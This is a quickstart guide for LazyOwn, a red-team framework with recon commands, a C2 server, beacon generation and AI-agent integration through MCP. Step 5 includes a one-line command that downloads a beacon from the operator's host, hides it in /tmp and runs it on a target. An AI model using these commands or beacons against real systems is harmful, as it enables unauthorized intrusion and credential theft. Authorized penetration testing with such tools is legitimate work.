# LazyOwn — 5-Minute Quickstart

Everything you need to go from a fresh clone to an active engagement.

After setup, read `ESSENTIALS.md` for the 18 commands that cover 80% of engagements.

---

## Prerequisites

- Kali Linux / Parrot OS (or any Debian-based distro)
- Python 3.10+
- `git`, `make`, `gcc`
- SecLists at `/usr/share/seclists` (or `/usr/share/wordlists/SecLists-master`)

```bash
sudo apt install -y seclists 2>/dev/null || true
```

---

## Step 1 — Clone and install

```bash
git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
bash install.sh
```

`install.sh` creates the virtualenv at `env/`, installs all Python deps, and generates `cert.pem` / `key.pem` for the C2.

---

## Step 2 — Run the guided setup wizard

```bash
./run
```

On first launch you will be prompted to run `wizard`. Accept. The wizard auto-detects your `lhost` from the routing table, walks you through 7 steps, and writes everything to `payload.json`.

```
(LazyOwn) > wizard
```

Or run the readiness check without changing anything:

```
(LazyOwn) > wizard --check
```

---

## Step 3 — Start recon (the golden path)

```bash
(LazyOwn) > ping           # confirm target is alive + detect OS
(LazyOwn) > lazynmap       # full port scan → sessions/scan_<rhost>.nmap
(LazyOwn) > auto_populate  # parse scan into world_model.json
(LazyOwn) > facts_show     # see what was discovered
```

That is the core loop. Everything else is built on top of it.

---

## Step 4 — Start the C2

In a second terminal:

```bash
bash fast_run_as_r00t.sh --no-attach --vpn 1
```

Or start it inline from the shell:

```bash
(LazyOwn) > lazyc2
```

The C2 starts at `https://<lhost>:<c2_port>` with the credentials from `payload.json` (`c2_user` / `c2_pass`, default `admin` / `admin`).

---

## Step 5 — Get your first shell

```bash
# Generate and deliver the Go beacon (two-stage, XOR-encoded)
(LazyOwn) > lazymsfvenom

# Or drop the Linux C beacon with BOF support
(LazyOwn) > blacksandbeacon
# Then run on target:
# curl -sk "http://<lhost>:<lport>/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
```

Once a beacon checks in, manage it from the C2 dashboard at `https://<lhost>:<c2_port>`.

---

## Step 6 (optional) — Connect Hermes Agent

```bash
bash scripts/setup_hermes_mcp.sh
```

Then restart Hermes or run `/reload-mcp`. LazyOwn exposes ~95 MCP tools for AI-assisted operation.

See `AGENTS.md` for the Hermes integration guide.

---

## Step 7 (optional) — Invite teammates

```bash
(LazyOwn) > collab_join alice
```

Prints the team dashboard URL. Everyone connects to `https://<lhost>:<c2_port>/collab/?operator=<handle>`.

---

## What to read next

| File | Read when |
|------|-----------|
| `ESSENTIALS.md` | You want the 18 core commands (start here after this doc) |
| `CHEATSHEET.md` | You know the basics and need the next 40 frequent commands |
| `skills/lazyown.md` | You are operating via MCP (AI operator) |
| `COMMANDS.md` | You need the full 333-command reference |
| `CLAUDE.md` | You are developing or extending the framework |

---

## Key files

| File | Purpose |
|------|---------|
| `payload.json` | Single source of truth — all config lives here |
| `sessions/scan_<ip>.nmap` | Nmap output — read before re-scanning |
| `sessions/world_model.json` | Current phase, discovered hosts, creds |
| `sessions/credentials*.txt` | Captured credentials |
| `sessions/LazyOwn_session_report.csv` | Full command history |

---

## Troubleshooting

**`wizard` can't detect lhost** — run `ip route` and set it manually:
```
(LazyOwn) > assign lhost 10.10.14.3
```

**C2 TLS errors** — regenerate certs:
```bash
bash gen_cert.sh
```

**Nmap taking too long** — check `sessions/scan_<rhost>.nmap` first; it may already exist from a previous run. `facts_show` reads it without rescanning.

**Missing SecLists** — install with `sudo apt install seclists` or set `dirwordlist` manually:
```
(LazyOwn) > assign dirwordlist /path/to/wordlist.txt
```
